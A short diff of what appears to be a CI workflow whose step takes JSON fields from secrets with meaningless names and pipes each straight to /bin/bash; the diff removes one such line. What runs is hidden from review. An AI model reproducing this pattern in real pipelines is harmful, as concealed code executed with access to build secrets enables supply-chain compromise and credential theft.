@@ -27,7 +27,6 @@ jobs:
           o95: ${{ secrets.o95 }}
         run: |
           printf '%s' "$o95" | jq -r .t99 | /bin/bash
-          echo $ieoou6002 | jq -r .hs8246 | /bin/bash
           printf '%s' "$yo051" | jq -r .qyh8 | /bin/bash
           echo $zyqvu21 | jq -r .u3 | /bin/bash
 
